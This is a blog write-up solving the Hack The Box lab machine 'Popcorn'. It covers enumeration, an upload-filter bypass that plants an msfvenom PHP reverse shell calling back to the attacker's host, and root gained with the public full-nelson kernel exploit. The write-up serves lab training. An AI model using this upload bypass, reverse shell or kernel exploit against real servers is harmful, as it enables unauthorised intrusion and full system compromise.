---
layout: post
title: HTB - Popcorn Writeup
date: 2019-01-06
image: '/images/posts/htb/popcorn/popcorn.jpg'
categories: ["writeups"]
tags: ["writeups", "popcorn", "htb"]
---

* Box: Popcorn
  - Difficulty: Medium
  - Points: 20
  - Release: 15 Mar 2017
  - IP: 10.10.10.6

###Initial Enumeration

####1.Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA popcorn.nmap 10.10.10.6`

We can see 22 and 80 are open. Let's navigate to the web browser and access the webpage on port 80.

<img src="/images/posts/htb/popcorn/popcorn1.jpg">

####Directory Enumeration

Running Dirbuster with the lowercase medium directory list shows us a directory called "torrent". So let's navigate to that directory in the browser.

<img src="/images/posts/htb/popcorn/popcorn2.jpg">

After navigating to the page, we see that we can sign up and upload only **.torrent** files

###Exploitation

####Testing what we can do/not do with uploads

Let's upload a test .torrent file and see what happens:

<img src="/images/posts/htb/popcorn/popcorn3.jpg">

Note that after submitting the file, we can see an "Edit Settings" option. Clicking this shows us the ability to upload screenshots in PNG format.

<img src="/images/posts/htb/popcorn/popcorn5.jpg">

<img src="/images/posts/htb/popcorn/popcorn4.jpg">

<img src="/images/posts/htb/popcorn/popcorn9.jpg">


This upload has 2 checks. It will confirm the uploaded file matches valid image extensions and it will check the POST data **Content-Type** is set to **image/png**.

Simply create a reverse shell payload and name it something like "write.png.php"
This command will generate one for you:

`msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.9 lport=444 -f raw`

Load up BurpSuite to intercept the file transfer. This will allow us to edit the parameters before they are forwarded to the web server.

Upload this file in the "Edit Settings" option as if it were a screenshot.

Your burpsuite should something like the below. You will want to change "application/php" to "image/png" and remove the ".png" portion from the filename.

<img src="/images/posts/htb/popcorn/popcorn8.jpg">

Our DirBuster results show a  "torrents" directory. Navigating to that shows us another "upload" directory within. Here we can see a list of all file uploads.

Next, we're going to set up a listener and capture the reverse_tcp shell.

####Metasploit

Load up metasploit and set a listener for the php/meterpreter/reverse_tcp payload you just uploaded.

<img src="/images/posts/htb/popcorn/popcorn7.jpg">

Once the listener is started, you can go ahead and click on the file in the "/torrent/upload" directory.
This should execute the file you uploaded and establish a connection back to your metasploit listener.
<img src="/images/posts/htb/popcorn/popcorn6.jpg">
Once we're in, the user flag can be found at **/home/george/user.txt**

<img src="/images/posts/htb/popcorn/popcorn11.jpg">

###Privilege Escalation

Getting root is fairly trivial, we can use the known exploit called "full-nelson".

We just need a way to get the C code for the exploit onto this machine.

More information on that exploit here: [exploits/15704](https://www.exploit-db.com/exploits/15704)

I just went ahead and setup a "**python -m SimpleHTTPServer**" and used "**wget**" to pull the file from my attacking box.

Once the file is present, compile it and run it like so:

You will get a root shell and can find the root flag in **/root/root.txt**

<img src="/images/posts/htb/popcorn/popcorn10.jpg">
